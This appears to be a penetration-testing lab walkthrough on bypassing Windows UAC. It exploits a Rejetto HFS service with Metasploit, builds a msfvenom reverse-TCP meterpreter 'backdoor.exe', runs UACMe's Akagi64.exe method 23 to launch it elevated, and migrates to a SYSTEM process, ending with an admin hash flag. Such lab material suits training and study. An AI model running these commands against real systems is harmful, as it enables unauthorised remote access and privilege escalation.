# Bypassing UAC With UACMe

## UAC (User Account Control)

- User Account Control (UAC) is a Windows security feature introduced in Windows Vista that is used to prevent unauthorized changes from being made to the operating system.

**Note**: UAC is available in modern versions of windows from Vista to Windows 11.

- UAC is used to ensure that changes to the operating system require approval from the administrator or a user account that is part of the local administrators group.
- A non-privileged user attempting to execute a program with elevated privileges will be prompted with the UAC credential prompt, whereas a privileged user will be prompted with a consent prompt.
- Attacks can bypass UAC in order to execute malicious executables with elevated privileges.

## Bypassing UAC

- In order to successfully bypass UAC, we will need to have access to a user account that is a part of the local administrators group on the Windows target system.
- UAC allows a program to be executed with administrative privileges, consequently prompting the user for confirmation.
- UAC has various integrity levels ranging from low to high, if the UAC protection level is set below high, Windows programs can be executed with elevated privileges without prompting the user for confirmation.

**Note**: By default, Windows set the UAC level below high, it only notifies the user when an executable is going to make changes into the machine, but it won't notify when changing windows settings. And we could exploit this misconfiguration in windows security.

- There are multiple tools and techniques that can be used to bypass UAC, however, the tool and technique used will depend on the version of Windows running on the target system.

## Bypassing UAC With UACMe

- UACMe is an open source, robust privilege escalation tool developed by @hfire0x. It can be used to bypass Windows UAC by leveraging various techniques.
    + GitHub: https://github.com/hfiref0x/UACME
- The UACME GitHub repository contains a very well documented list of methods that can be used to bypass UAC on multiple versions of Windows ranging from Windows 7 to Windows 10.
- It allows attackers to execute malicious payloads on a Windows target with administrative/elevated privileges by abusing the inbuilt Windows AutoElevate tool.
- The UACMe GitHub repository has more than 60 exploits that can be used to bypass UAC depending on the version of Windows running on the target.

## Laboratory

### Initial Access

- We start by performing an Nmap scan on the target.

- We will take advantage of any vulnerability present on the target machine in order to get inital access by establishing a meterpreter or command shell session. In this case the vulnerability is in one of the services running on the target machine in port 80.

- You should identify a file sharing service called HFS on port 80 developed by Rejetto. Use MSFconsole in order to exploit the service and get initial access. Set the required options and run the exploit.

**Note**: use the search command in msfconsole to look up the desired module.

**Note**: remember you can set global options when you start the msfconsole by running `setg OPTION VALUE`.

- Once you have access to the target machine through a meterpreter session, perform some basic local enumeration to know what version of windows is running, what user we have access to, level of privilege, etc. Running `sysinfo` could reveal some useful information about the machine, `getuid` will give you the name of the user, if it is `Administrator`, good for you as it is a privileged account. In any other case, you could check if the current user you have access to is part of the local administrators group, which should be enough to bypass UAC. Run `getprivs` in the meterpreter shell.

**Note**: if you injected an x86 meterpreter session and the target is running on x64, you can run `pgrep explorer` to get the pid of the explorer and migrate your meterpreter session to that pid using `migrate $EXPLORER_PID`. However, any process running x64 should be enough.

- To get some more information, we will need to start a command shell session by running `shell` in the meterpreter session. Here we can run the command `net user` to enumerate existing users in the target. Then run `net localgroup administrators` to get the list of users belonging to the local administrator group. Now try to change the password by running `net user $USER $NEW_PASSWORD`, if the action is denied and error code 5 is display, we are facing a UAC wall that won't let us change anything unless bypassed and for that we will use UAC.

### UACMe

Now we are going to use UACMe https://github.com/hfiref0x/UACME, the documentation explains very well how it works in the readme of the repository. In this case, we only need to focus on the packet called Akagi. The method we are going to use is the number 23. 

- The first step is, of course, generate a meterpreter payload using msfvenom like this: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=$YOUR_IP LPORT=$YOUR_PORT -f exe > backdoor.exe` and we are going to use our existing meterpreter session to send the backdoor and the UACME Akagi.exe.

**Note**: UACME comes precompiled and ready to use in your lab environment, however, for any other case you will need to compile it yourself as binaries are not downloadable anymore.

**Note**: UACME replicates popular methods used by malware, be wary of other methods not known by the public that could be used by malicious actors.

- We will now execute a new msfconsole in another terminal tab and select the `multi/handler` to receive the connection once the payload is executed on the target and set the payload `windows/meterpreter/reverse_tcp` and LHOST and LPORT like you set it with msfvenom and then run it.

- Now from the session opened during getting initial access step, we are going to navigate to the root of the C drive `C:\\`, create a Temp directory, navigate to the Temp folder and then run `upload backdoor.exe` to upload the payload you created with msfvenom. Then upload the akagi executable in `/root/Desktop/tools/UACME/Akagai64.exe`.

- After that, just run `shell` in the meterpreter session to open a channel with a cmd shell in the Temp directoy.

- From there, run `.\Akagi64.exe 23 C:\Temp\backdoor.exe`. Remember the method is 23 and the path to the backdoor you want to execute must be passed as an absolute path.

- From there, check the listening agent running in msfconsole in the second terminal tab, you should see a connection that will open a meterpreter session with elevated privileges, of course running as the victim's user, but you can just migrate to another process. Run `sysinfo` and `getprivs` to check your current privilege level. And run `ps` to see all processes running in the machine, you could choose one run by the NT AUTHORITY\SYSTEM and migrate to that process to successfully escalate your privileges.

**Note**: It is highly recommended to test different builds versions of Windows with the UACMe tool using different methods to get experience using UACMe.

**Note**: Unfixed methods are the best ones to test out there.

Admin nt hash (Flag): 4d6583ed4cef81c2f2ac3c88fc5f3da6